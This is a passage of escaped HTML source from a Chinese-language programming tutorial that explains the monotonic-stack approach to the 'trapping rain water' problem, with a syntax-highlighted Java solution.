class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ans&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;单调栈&#34;&gt;单调栈&lt;/h2&gt;
&lt;p&gt;单调栈就是保持栈内元素有序。和栈与队列：单调队列一样，需要我们自己维持顺序，没有现成的容器可以用。&lt;/p&gt;
&lt;p&gt;通常是一维数组，要寻找任一个元素的右边或者左边第一个比自己大或者小的元素的位置，此时我们就要想到可以用单调栈了。&lt;/p&gt;
&lt;p&gt;而接雨水这道题目，我们正需要寻找一个元素，右边最大元素以及左边最大元素，来计算雨水面积。&lt;/p&gt;
&lt;p&gt;先将下标0的柱子加入到栈中，st.push(0);。 栈中存放我们遍历过的元素，所以先将下标0加进来。&lt;/p&gt;
&lt;p&gt;然后开始从下标1开始遍历所有的柱子，for (int i = 1; i &amp;lt; height.size(); i++)。&lt;/p&gt;
&lt;p&gt;如果当前遍历的元素（柱子）高度小于栈顶元素的高度，就把这个元素加入栈中，因为栈里本来就要保持从小到大的顺序（从栈头到栈底）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// in the stack, we push the index of array&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// using height[] to access the real height&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Stack&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Integer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;peek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 因为相等的相邻墙，左边一个是不可能存放雨水的，所以pop左边的index, push当前的index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//pop up all lower value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heightAtIdx&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isEmpty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;heightAtIdx&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isEmpty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()){&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;peek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hold&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span 